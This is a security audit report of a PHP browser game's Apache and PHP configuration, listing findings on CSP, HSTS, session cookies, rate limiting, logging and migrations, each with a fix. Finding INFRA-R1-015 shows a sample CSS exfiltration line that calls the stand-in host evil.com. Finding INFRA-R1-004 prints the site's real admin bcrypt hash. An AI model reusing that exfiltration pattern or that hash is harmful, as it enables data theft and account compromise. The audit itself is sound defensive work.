# Infrastructure & Server Configuration Security Audit

**Audit Date:** 2026-03-03
**Auditor:** Round 1 Infrastructure Review
**Scope:** .htaccess, session/connection configuration, env handling, logging, rate limiting, migrations, sensitive file exposure, security headers, SSL/TLS readiness

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 4     |
| HIGH     | 9     |
| MEDIUM   | 12    |
| LOW      | 8     |
| **Total**| **33**|

---

## CRITICAL Findings

### [INFRA-R1-001] [CRITICAL] .htaccess:7 -- CSP allows 'unsafe-inline' for script-src, defeating XSS protection

**File:** `.htaccess` line 7

```
script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;
```

**Description:** The Content-Security-Policy allows `'unsafe-inline'` in `script-src`, which permits arbitrary inline JavaScript execution. This renders CSP nearly useless as an XSS mitigation. An attacker who achieves HTML injection can execute scripts via inline `<script>` tags or event handlers (`onclick`, `onerror`, etc.) without violating the policy.

**Recommendation:** Remove `'unsafe-inline'` from `script-src`. Migrate all inline scripts to external `.js` files. If inline scripts are absolutely necessary, use CSP nonces (`'nonce-{random}'`) generated per-request. As an intermediate step, add `'strict-dynamic'` with nonces to gradually phase out `'unsafe-inline'`.

---

### [INFRA-R1-002] [CRITICAL] includes/session_init.php:8 -- session.cookie_secure is conditionally disabled, allowing session hijacking over HTTP

**File:** `includes/session_init.php` line 8

```php
ini_set('session.cookie_secure', !empty($_SERVER['HTTPS']) ? 1 : 0);
```

**Description:** When the server is accessed over HTTP (which is the current state -- HTTPS is not yet enabled), the session cookie is sent without the `Secure` flag. This means the session ID is transmitted in plaintext and can be intercepted by any network observer (WiFi sniffing, ISP monitoring, MITM). Even after HTTPS is enabled, if a user ever hits the HTTP version (no redirect is configured), the cookie leaks.

**Recommendation:**
1. Enable HTTPS via Let's Encrypt immediately.
2. Hardcode `ini_set('session.cookie_secure', 1)` -- never conditionally disable it.
3. Add HTTP-to-HTTPS redirect in `.htaccess` or Apache vhost.
4. Add HSTS header (see INFRA-R1-003).

---

### [INFRA-R1-003] [CRITICAL] .htaccess -- Missing Strict-Transport-Security (HSTS) header

**File:** `.htaccess` (absent)

**Description:** No `Strict-Transport-Security` header is configured anywhere. Even once HTTPS is enabled, browsers will not remember to use HTTPS and users can be downgraded to HTTP via MITM attacks (SSL stripping). This is an entire class of attack that HSTS eliminates.

**Recommendation:** Add to `.htaccess` inside the `mod_headers` block:
```
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
```
Start with a shorter `max-age` (e.g., 300) during testing, then increase to 31536000 (1 year). Requires HTTPS to be functional first.

---

### [INFRA-R1-004] [CRITICAL] includes/constantesBase.php:54 -- Admin password hash hardcoded in source-controlled PHP file

**File:** `includes/constantesBase.php` lines 52-55

```php
// Pre-computed hash. To change: php -r "echo password_hash('new-password', PASSWORD_DEFAULT);"
if (!defined('ADMIN_PASSWORD_HASH')) {
    define('ADMIN_PASSWORD_HASH', '$2y$10$PibWl.r/3LA3HMwuSchD0et2Mjkac0D6kzuwxvOAbSqUTBf7zhGES');
}
```

**Description:** The admin password hash is committed to the Git repository (`constantesBase.php` is not in `.gitignore`). While bcrypt hashes are computationally expensive to brute-force, this still represents a credential exposure in version control. Anyone with read access to the repository can attempt offline cracking. The GitHub repository is also public/shared, increasing exposure surface.

**Recommendation:** Move `ADMIN_PASSWORD_HASH` to the `.env` file and load it via `getenv()`. The `.env` file is already `.gitignore`-d. This follows the pattern already established for database credentials.

---

## HIGH Findings

### [INFRA-R1-005] [HIGH] .htaccess -- No HTTP-to-HTTPS redirect configured

**File:** `.htaccess` (absent)

**Description:** There is no `RewriteRule` or redirect forcing HTTP traffic to HTTPS. Users accessing `http://theverylittlewar.com` will remain on HTTP, exposing all traffic including session cookies, credentials, and game data.

**Recommendation:** Add to `.htaccess`:
```
RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
```
This must be activated after HTTPS is configured on the server.

---

### [INFRA-R1-006] [HIGH] .htaccess -- Missing Permissions-Policy header

**File:** `.htaccess` (absent)

**Description:** No `Permissions-Policy` (formerly `Feature-Policy`) header is set. This means the browser grants default permissions for camera, microphone, geolocation, payment API, and other sensitive features. An XSS or content injection attack could abuse these browser APIs.

**Recommendation:** Add:
```
Header always set Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()"
```

---

### [INFRA-R1-007] [HIGH] .htaccess:7 -- CSP missing object-src, base-uri, and form-action directives

**File:** `.htaccess` line 7

**Description:** The CSP policy is missing several critical directives:
- `object-src` -- defaults to `default-src 'self'`, but should explicitly be `'none'` to block Flash/Java/plugin-based attacks.
- `base-uri` -- not set, allowing `<base>` tag injection to redirect relative URLs to attacker-controlled domains (form credential theft).
- `form-action` -- not set, allowing forms to submit to any origin (data exfiltration via form redirection).
- `upgrade-insecure-requests` -- not set, meaning mixed content will not be auto-upgraded.

**Recommendation:** Expand the CSP to:
```
default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests
```

---

### [INFRA-R1-008] [HIGH] migrations/ directory -- No .htaccess protection, migrate.php web-accessible

**File:** `migrations/migrate.php` (no `migrations/.htaccess` exists)

**Description:** The `migrations/` directory has no `.htaccess` file to deny web access. The `migrate.php` script includes `connexion.php`, establishes a database connection, and runs `mysqli_multi_query()` against SQL files. If accessed via HTTP (`https://theverylittlewar.com/migrations/migrate.php`), it would attempt to run all pending migrations against the production database. Additionally, the `.sql` files are individually accessible.

While the root `.htaccess` blocks `.sql` files via `FilesMatch`, it does not block `.php` files in subdirectories.

**Recommendation:** Add `migrations/.htaccess`:
```
Require all denied
```
Or add to root `.htaccess`:
```
<DirectoryMatch "^.*/migrations/">
    Require all denied
</DirectoryMatch>
```

---

### [INFRA-R1-009] [HIGH] migrations/migrate.php:43 -- mysqli_multi_query used without transaction wrapping

**File:** `migrations/migrate.php` line 43

```php
if (mysqli_multi_query($base, $sql)) {
```

**Description:** `mysqli_multi_query()` executes multiple SQL statements from a file in sequence. If any intermediate statement fails, prior statements have already been committed (no transaction wrapping). The error check at line 51 only detects the last error. This can leave the database in a partially-migrated, inconsistent state. Additionally, `mysqli_multi_query()` is inherently more dangerous than single-statement execution because it enables SQL injection via crafted migration files (supply chain risk).

**Recommendation:** Split SQL files into individual statements, execute each with `mysqli_query()` inside a transaction. For DDL statements (which cannot be rolled back in MySQL/MariaDB), execute them individually with explicit error checking after each.

---

### [INFRA-R1-010] [HIGH] includes/rate_limiter.php:8 -- Rate limit data stored in world-readable /tmp directory

**File:** `includes/rate_limiter.php` line 8

```php
define('RATE_LIMIT_DIR', '/tmp/tvlw_rates');
```

**Description:** Rate limit state files are stored in `/tmp/tvlw_rates/`. On shared hosting or multi-tenant systems, `/tmp` is world-readable. Any local user can read the JSON files, enumerate IP addresses that have attempted login, and manipulate rate limit files (delete them to bypass rate limiting, or fill them to create denial-of-service for specific IPs). The filenames are MD5 hashes of `$identifier_$action`, which are predictable.

**Recommendation:** Move to a directory under the application with restricted permissions:
```php
define('RATE_LIMIT_DIR', __DIR__ . '/../data/rates');
```
Ensure the directory is created with `0700` permissions and has a `.htaccess` with `Require all denied`. Alternatively, move rate limiting to the database for multi-server consistency.

---

### [INFRA-R1-011] [HIGH] includes/session_init.php -- Missing session.use_only_cookies and session.use_trans_sid settings

**File:** `includes/session_init.php`

**Description:** The session initialization does not explicitly set:
- `session.use_only_cookies = 1` -- prevents session ID from being accepted via URL query parameters.
- `session.use_trans_sid = 0` -- prevents PHP from automatically appending session IDs to URLs.

While PHP 8.x defaults these to safe values, relying on defaults is fragile. A `php.ini` change or `.user.ini` override could re-enable URL-based session IDs, enabling session fixation attacks.

**Recommendation:** Add to `session_init.php`:
```php
ini_set('session.use_only_cookies', 1);
ini_set('session.use_trans_sid', 0);
```

---

### [INFRA-R1-012] [HIGH] .htaccess -- No Cache-Control headers for authenticated pages

**File:** `.htaccess` (absent)

**Description:** No `Cache-Control`, `Pragma`, or `Expires` headers are configured. Authenticated pages containing sensitive game data (resources, army composition, alliance info) may be cached by browsers, proxies, or CDNs. A shared computer user could access cached pages via the back button. Proxy servers could serve stale authenticated content to other users.

**Recommendation:** For PHP pages, add cache-control headers:
```
<FilesMatch "\.php$">
    Header set Cache-Control "no-store, no-cache, must-revalidate, private"
    Header set Pragma "no-cache"
</FilesMatch>
```

---

### [INFRA-R1-013] [HIGH] .htaccess:14 -- .env file not explicitly blocked by FilesMatch pattern

**File:** `.htaccess` lines 14, 24-33

**Description:** The `.env` file is technically protected by two rules: (1) the hidden-files rule blocks files starting with `.` (line 25), and (2) `.env` does not match the listed extensions in line 14. However, the hidden-files `FilesMatch "^\."` rule protects against direct file access but NOT against Apache aliases or rewrite rules that might strip the leading dot. There is no explicit rule blocking `.env` by name. If the hidden-files block were ever modified or removed, `.env` (containing database credentials) would be exposed.

**Recommendation:** Add an explicit block:
```
<Files ".env">
    Require all denied
</Files>
```
Defense-in-depth: also ensure `.env` is outside the web root on the VPS.

---

## MEDIUM Findings

### [INFRA-R1-014] [MEDIUM] .htaccess:5 -- X-XSS-Protection header is deprecated and can cause vulnerabilities

**File:** `.htaccess` line 5

```
Header set X-XSS-Protection "1; mode=block"
```

**Description:** The `X-XSS-Protection` header activates the browser's built-in XSS auditor, which has been removed from all modern browsers (Chrome removed it in 2019, Firefox never implemented it). In some edge cases, the XSS auditor itself introduced vulnerabilities (information leakage via timing attacks). Modern security guidance recommends removing this header entirely and relying on CSP.

**Recommendation:** Change to `Header set X-XSS-Protection "0"` to explicitly disable the auditor, or remove the header entirely. CSP is the proper XSS mitigation.

---

### [INFRA-R1-015] [MEDIUM] .htaccess:7 -- CSP style-src allows 'unsafe-inline', weakening CSS injection protection

**File:** `.htaccess` line 7

```
style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;
```

**Description:** `'unsafe-inline'` in `style-src` allows inline style injection, which can be used for data exfiltration via CSS (e.g., `background: url(https://evil.com/?secret=...)` on elements containing sensitive data). While less severe than `script-src 'unsafe-inline'`, it weakens the overall CSP posture.

**Recommendation:** Move inline styles to external CSS files. If inline styles are required for Framework7, use CSP nonces for style blocks.

---

### [INFRA-R1-016] [MEDIUM] .htaccess:39 -- error_reporting set to E_ALL (32767) in production

**File:** `.htaccess` line 39

```
php_value error_reporting 32767
```

**Description:** `E_ALL` (32767) logs every notice, warning, strict standard, and deprecation. On PHP 8.2, this generates massive log volumes from deprecation notices and strict type checks. While `display_errors` is off (good), the excessive logging can fill disk space, create performance overhead on every request, and make it harder to find genuine errors among noise.

**Recommendation:** Use `E_ALL & ~E_DEPRECATED & ~E_STRICT` (value: `24575`) for production:
```
php_value error_reporting 24575
```

---

### [INFRA-R1-017] [MEDIUM] .htaccess:36 -- mod_php directives may not apply under PHP-FPM

**File:** `.htaccess` lines 36-41

```
<IfModule mod_php.c>
    php_flag display_errors off
    ...
</IfModule>
```

**Description:** The `<IfModule mod_php.c>` condition means these directives only apply when PHP runs as an Apache module (mod_php). If the VPS uses PHP-FPM (via `mod_proxy_fcgi`), this entire block is silently ignored and `display_errors` may be whatever the system `php.ini` specifies. On Debian 12 with PHP 8.2, PHP-FPM is the recommended deployment.

**Recommendation:** Verify which PHP SAPI is in use (`php -r "echo php_sapi_name();"` on the VPS). If PHP-FPM is used:
1. Set these values in `/etc/php/8.2/fpm/php.ini` or a pool-specific `.conf` file.
2. Add a `.user.ini` file in the web root with the same settings (PHP-FPM reads `.user.ini`).

---

### [INFRA-R1-018] [MEDIUM] includes/connexion.php:20 -- Database charset set to utf8 instead of utf8mb4

**File:** `includes/connexion.php` line 20

```php
mysqli_set_charset($base, 'utf8');
```

**Description:** MySQL's `utf8` charset is actually `utf8mb3`, which only supports 3-byte characters (BMP). It cannot store 4-byte characters (emojis, some CJK, mathematical symbols). More importantly from a security perspective, `utf8mb3` truncation behavior can be exploited in certain SQL injection scenarios where 4-byte characters cause silent data truncation. Migration 0013 converts tables to `utf8mb4` but the connection charset remains `utf8`.

**Recommendation:** Change to:
```php
mysqli_set_charset($base, 'utf8mb4');
```

---

### [INFRA-R1-019] [MEDIUM] includes/connexion.php:17 -- Database connection error exposes no useful info but also lacks logging

**File:** `includes/connexion.php` lines 16-18

```php
if (!$base) {
    die('Erreur de connexion à la base de données.');
}
```

**Description:** Database connection failures are silently swallowed with a generic message (good for user-facing), but no error is logged. This makes it impossible to diagnose connection issues (wrong credentials, MySQL down, max connections reached) from application logs. The `error_log()` on line 10 only fires when env vars are missing, not when `mysqli_connect()` itself fails.

**Recommendation:** Add logging before the `die()`:
```php
if (!$base) {
    error_log('TVLW: Database connection failed: ' . mysqli_connect_error());
    die('Erreur de connexion à la base de données.');
}
```

---

### [INFRA-R1-020] [MEDIUM] includes/env.php:11 -- putenv() used for credential loading, vulnerable to thread safety issues

**File:** `includes/env.php` line 11

```php
if (!getenv($name)) putenv("$name=$value");
```

**Description:** `putenv()` modifies the process environment, which is not thread-safe. If PHP is running under a threaded MPM (worker, event), `putenv()` in one request can affect another request's environment. Additionally, `putenv()` values are visible to all child processes, including shell commands executed via `exec()`/`system()`. The `getenv()` check prevents overwriting system-level env vars, which is good, but the underlying mechanism is fragile.

**Recommendation:** Use `$_ENV` or a dedicated config array instead of `putenv()`/`getenv()`:
```php
function loadEnv($path) {
    if (!file_exists($path)) return;
    $lines = file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue;
        $parts = explode('=', $line, 2);
        if (count($parts) !== 2) continue;
        $name = trim($parts[0]);
        $value = trim($parts[1], " \t\n\r\0\x0B\"'");
        $_ENV[$name] = $value;
    }
}
```

---

### [INFRA-R1-021] [MEDIUM] includes/logger.php:20 -- Log directory created with 0755 permissions, potentially world-readable

**File:** `includes/logger.php` line 20

```php
mkdir(LOG_DIR, 0755, true);
```

**Description:** The `logs/` directory is created with `0755` permissions, meaning any local user can read log files. Logs contain IP addresses, login names, and potentially sensitive game action details. The `logs/.htaccess` has `Deny from all` which blocks web access, but local filesystem access is unrestricted.

**Recommendation:** Use `0750` or `0700` for the log directory:
```php
mkdir(LOG_DIR, 0750, true);
```

---

### [INFRA-R1-022] [MEDIUM] includes/logger.php:26-27 -- Log injection possible via unsanitized session login and IP

**File:** `includes/logger.php` lines 26-27

```php
$login = $_SESSION['login'] ?? 'anonymous';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
```

**Description:** The `$login` value from the session is included in log lines without sanitization. If a username contains log-forging characters (newlines, bracket sequences like `[ERROR]`), it can corrupt log parsing or inject false log entries. While `validateLogin()` restricts registration to `[a-zA-Z0-9_]{3,20}`, legacy users or a database compromise could introduce malicious values.

**Recommendation:** Sanitize values before logging:
```php
$login = preg_replace('/[^a-zA-Z0-9_]/', '_', $_SESSION['login'] ?? 'anonymous');
$ip = filter_var($_SERVER['REMOTE_ADDR'] ?? 'unknown', FILTER_VALIDATE_IP) ?: 'invalid';
```

---

### [INFRA-R1-023] [MEDIUM] includes/rate_limiter.php:14 -- Rate limit directory created with 0755, world-readable

**File:** `includes/rate_limiter.php` line 14

```php
mkdir($dir, 0755, true);
```

**Description:** Same issue as INFRA-R1-021. Rate limit files in `/tmp/tvlw_rates/` are created in a world-readable directory. Files contain JSON arrays of timestamps that reveal when specific IPs attempted login.

**Recommendation:** Use `0700` permissions:
```php
mkdir($dir, 0700, true);
```

---

### [INFRA-R1-024] [MEDIUM] includes/rate_limiter.php -- File-based rate limiter is susceptible to race conditions

**File:** `includes/rate_limiter.php` lines 21-37

**Description:** The rate limiter reads a file, checks the count, then writes back. Between the read and write, another concurrent request from the same IP can also read the old count and both pass the check. This TOCTOU (time-of-check-time-of-use) race condition allows bypassing rate limits under concurrent attack. While `LOCK_EX` is used on write (line 36), there is no lock on read (line 22 uses plain `file_get_contents`).

**Recommendation:** Use `flock()` for atomic read-check-write:
```php
$fp = fopen($file, 'c+');
flock($fp, LOCK_EX);
$data = json_decode(stream_get_contents($fp), true);
// ... check and update ...
ftruncate($fp, 0);
rewind($fp);
fwrite($fp, json_encode(array_values($attempts)));
flock($fp, LOCK_UN);
fclose($fp);
```

---

### [INFRA-R1-025] [MEDIUM] tests/ directory -- No .htaccess protection, test files potentially web-accessible

**File:** `tests/` directory (no `.htaccess` exists)

**Description:** The `tests/` directory containing PHPUnit tests has no web access restriction. While test files themselves are unlikely to be directly exploitable, they may reveal internal architecture, file paths, database table names, and testing credentials.

**Recommendation:** Add `tests/.htaccess`:
```
Require all denied
```

---

## LOW Findings

### [INFRA-R1-026] [LOW] .htaccess -- Missing Cross-Origin-Opener-Policy (COOP) and Cross-Origin-Resource-Policy (CORP) headers

**File:** `.htaccess` (absent)

**Description:** `Cross-Origin-Opener-Policy` and `Cross-Origin-Resource-Policy` headers are not set. COOP prevents window references from cross-origin documents (mitigating Spectre-type side-channel attacks). CORP controls which origins can include resources.

**Recommendation:** Add:
```
Header always set Cross-Origin-Opener-Policy "same-origin"
Header always set Cross-Origin-Resource-Policy "same-origin"
```

---

### [INFRA-R1-027] [LOW] .htaccess -- Missing ServerTokens/ServerSignature directives

**File:** `.htaccess` (absent)

**Description:** `ServerTokens` and `ServerSignature` are not configured in `.htaccess`. These are typically set in the main Apache config, but if not configured there, Apache will disclose its version in response headers (`Server: Apache/2.4.57 (Debian)`) and error pages. This information aids attackers in identifying specific CVEs.

**Recommendation:** Verify these are set in the Apache vhost or `apache2.conf`:
```
ServerTokens Prod
ServerSignature Off
```
These directives cannot be set in `.htaccess` -- they must be in the server config.

---

### [INFRA-R1-028] [LOW] .htaccess:3 -- Security headers use "set" instead of "always set"

**File:** `.htaccess` lines 3-7

```
Header set X-Content-Type-Options "nosniff"
```

**Description:** `Header set` only applies to successful (2xx) responses. If Apache returns a 4xx or 5xx error page, these security headers will not be present. An attacker exploiting an error condition could bypass header-based protections on the error page.

**Recommendation:** Change all `Header set` to `Header always set`:
```
Header always set X-Content-Type-Options "nosniff"
Header always set X-Frame-Options "SAMEORIGIN"
...
```

---

### [INFRA-R1-029] [LOW] includes/basicprivatephp.php:23-26 -- Legacy MD5 session fallback still active

**File:** `includes/basicprivatephp.php` lines 23-31

```php
} elseif (isset($_SESSION['login']) && isset($_SESSION['mdp'])) {
    // Legacy fallback: password-hash-based sessions still active after upgrade
    $row = dbFetchOne($base, 'SELECT pass_md5 FROM membre WHERE login = ?', 's', $_SESSION['login']);
    if (!$row || $row['pass_md5'] !== $_SESSION['mdp']) {
```

**Description:** The legacy fallback compares `$_SESSION['mdp']` with the database password hash using `!==` (strict equality). This is technically a timing-safe comparison for this specific case (both values are the same hash), but the legacy path stores the password hash in the session. If session storage is compromised (file-based sessions on shared hosting), the password hash is exposed directly. The code has a `TODO` comment to remove this block.

**Recommendation:** Remove the legacy fallback. Any sessions still using the `mdp` approach should be forced to re-authenticate. This migration window has likely passed.

---

### [INFRA-R1-030] [LOW] includes/logger.php:32 -- Log files not rotated, no size limits

**File:** `includes/logger.php` line 32

```php
$filename = LOG_DIR . '/' . date('Y-m-d') . '.log';
```

**Description:** Daily log files are created but never rotated or cleaned up. Over months/years, log files will accumulate and consume disk space. With `error_reporting = E_ALL` generating verbose logs, this can fill the disk partition, causing application failures.

**Recommendation:** Implement log rotation:
1. Add a cron job: `find /var/www/html/logs -name "*.log" -mtime +30 -delete`
2. Or configure `logrotate` for the logs directory.
3. Consider setting a max file size in the `gameLog()` function.

---

### [INFRA-R1-031] [LOW] .env.example:3 -- Example .env shows root user with empty password

**File:** `.env.example` lines 2-4

```
DB_HOST=localhost
DB_USER=root
DB_PASS=
DB_NAME=theveryl_theverylittlewar
```

**Description:** The example `.env` file shows `DB_USER=root` with an empty password. Developers copying this file may use root access for the application database connection. The production `.env` uses a dedicated user (`tvlw`), but the example sets a poor precedent.

**Recommendation:** Update `.env.example` to show a non-root user:
```
DB_HOST=localhost
DB_USER=tvlw_user
DB_PASS=CHANGE_ME
DB_NAME=tvlw
```

---

### [INFRA-R1-032] [LOW] migrations/0004_add_attack_cooldowns.sql:3 -- Attack cooldown uses INT for unix timestamp (Y2038 issue)

**File:** `migrations/0004_add_attack_cooldowns.sql` line 6

```sql
expires INT NOT NULL,
```

**Description:** The `expires` column uses `INT` (signed 32-bit) for Unix timestamps. This will overflow on 2038-01-19. While the game may not be running in 2038, using `BIGINT` is a zero-cost future-proofing measure that was already applied to other timestamp columns in migration 0002.

**Recommendation:** Change to `BIGINT NOT NULL` in a new migration.

---

### [INFRA-R1-033] [LOW] includes/connexion.php -- No SSL/TLS encryption for database connection

**File:** `includes/connexion.php` line 14

```php
$base = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
```

**Description:** The database connection does not use SSL/TLS. Since the database is on `localhost`, traffic does not traverse the network, making this low risk. However, if the database is ever moved to a separate server, credentials and queries would be sent in plaintext.

**Recommendation:** For defense-in-depth, configure MariaDB SSL and use:
```php
mysqli_ssl_set($base, NULL, NULL, '/path/to/ca-cert.pem', NULL, NULL);
$base = mysqli_real_connect($base, $db_host, $db_user, $db_pass, $db_name, 3306, NULL, MYSQLI_CLIENT_SSL);
```
This is low priority while the database remains on localhost.

---

## Configuration Posture Summary

### What is working well

1. **Prepared statements throughout** -- `database.php` provides safe query helpers; no raw SQL concatenation found in includes.
2. **CSRF protection** -- Token generation uses `random_bytes(32)`, verification uses `hash_equals()`.
3. **Session hardening** -- `httponly`, `strict_mode`, `samesite=Lax`, periodic regeneration, idle timeout, database-backed session tokens.
4. **bcrypt passwords** -- `PASSWORD_DEFAULT` used for all password hashing with MD5 auto-migration.
5. **Rate limiting on login** -- 10 attempts per 5 minutes per IP.
6. **Sensitive file blocking** -- `.htaccess` blocks `.sql`, `.md`, `.json`, `.xml`, hidden files.
7. **includes/ directory protected** -- Dedicated `.htaccess` with `Require all denied`.
8. **logs/ directory protected** -- `Deny from all` in `.htaccess`.
9. **Upload directory hardened** -- PHP execution disabled, MIME type validation, random filenames.
10. **Display errors disabled** -- `display_errors off` prevents information leakage to users.
11. **Directory listing disabled** -- `Options -Indexes` set.
12. **Input validation module** -- `validation.php` provides consistent sanitization helpers.
13. **`.env` in `.gitignore`** -- Database credentials not committed to repository.
14. **InnoDB migration** -- Transaction support enabled via migration 0013.

### Priority remediation order

1. **CRITICAL:** Enable HTTPS, then hardcode `cookie_secure=1`, add HSTS header (INFRA-R1-002, R1-003, R1-005)
2. **CRITICAL:** Remove `'unsafe-inline'` from CSP `script-src` (INFRA-R1-001)
3. **CRITICAL:** Move admin password hash to `.env` (INFRA-R1-004)
4. **HIGH:** Add `.htaccess` protection to `migrations/` and `tests/` directories (INFRA-R1-008, R1-025)
5. **HIGH:** Complete CSP with `object-src`, `base-uri`, `form-action` (INFRA-R1-007)
6. **HIGH:** Add `Permissions-Policy` header (INFRA-R1-006)
7. **HIGH:** Fix rate limiter storage location and race condition (INFRA-R1-010, R1-024)
8. **HIGH:** Add `Cache-Control` headers (INFRA-R1-012)
9. **HIGH:** Add explicit session cookie safety settings (INFRA-R1-011)
10. **MEDIUM:** Fix remaining issues in priority order
